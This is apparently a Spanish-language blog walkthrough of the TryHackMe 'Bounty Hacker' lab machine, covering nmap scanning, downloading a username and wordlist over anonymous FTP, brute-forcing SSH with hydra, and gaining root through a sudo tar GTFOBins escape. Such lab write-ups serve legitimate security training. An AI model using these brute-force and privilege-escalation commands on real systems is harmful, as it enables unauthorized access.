---
layout: single
title: Bounty Hacker - TryHackMe
excerpt: "Bounty Hacker es una máquina Linux creada por grayhat, en esta máquina encontraremos un usuario y un diccionario dentro de un servidor FTP, usaremos hydra para encontrar una contraseña 
válida para conectarnos a la máquina objetivo. Elevaremos privilegios usando el recurso GTFOBins y el binario tar."
date: 2021-10-04
classes: wide
header:
  teaser: /assets/images/thm-bountyHacker/BH.jpeg
  teaser_home_page: true
  icon: /assets/images/thm.png
categories:
  - tryhackme
  - linux
  - fácil
tags:
  - tryhackme
  - hydra
  - tar
  - grayhat
---

### Escaneo de puertos
```bash
nmap -p- -T5 --open -v -n -Pn 10.10.54.251

PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

### Escaneo de servicios
```bash
nmap -sCV -p 21,22,80 10.10.54.251 

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
|_-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.154.249
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
|_  256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

### FTP
Me conecto al servidor ftp y me descargo los dos archivos txt.
```bash
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Jun 07  2020 .
drwxr-xr-x    2 ftp      ftp          4096 Jun 07  2020 ..
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
```

### Archivo task.txt
Al abrir el archivo task.txt veo un usuario potencial.

![](/assets/images/thm-bountyHacker/task.png)


### Archivo locks.txt
El archivo locks.txt es un diccionario.

![](/assets/images/thm-bountyHacker/locks.png)

### Fuerza bruta
Uso hydra para comprobar si tengo acceso al servidor SSH mediante el usuario lin y el diccionario que he encotrado anteriormente.

```bash
hydra -V -t 50 -l lin -P locks.txt  ssh://10.10.54.251 -f -I
```

### SSH
Me conecto a la máquina por SSH con las credenciales obtenidas con hydra.

```bash
ssh lin@10.10.54.251      
lin@bountyhacker:~/Desktop$
```

Como usuario lin puedo leer la flag user.

```bash
lin@bountyhacker:~/Desktop$ cat user.txt 
THM{CXXX3_SXXXXXXX3}
```

### Elevación de privilegios
Compruebo los comandos que puedo ejecutar con sudo.

![](/assets/images/thm-bountyHacker/sudoMenoseLe.png)

El usuario lin puede ejecutar como root el binario tar, usaré el recurso gtfobins.

![](/assets/images/thm-bountyHacker/tarGTFobins.png)

```bash
lin@bountyhacker:~/Desktop$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: Removing leading `/' from member names
# id;whoami
uid=0(root) gid=0(root) groups=0(root)
root
```

Como root ya puedo leer la flag de root.
```bash
# cat root.txt
THM{XXXXXX_XXXXXX}
```
